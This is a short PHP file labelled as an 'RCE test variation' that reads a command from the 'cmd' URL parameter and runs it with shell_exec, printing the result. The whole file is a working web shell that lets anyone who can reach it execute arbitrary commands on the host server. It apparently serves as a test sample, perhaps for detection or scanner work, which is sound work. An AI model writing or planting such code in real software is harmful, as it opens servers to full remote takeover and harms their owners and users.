<?php
// RCE test variation #1121
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>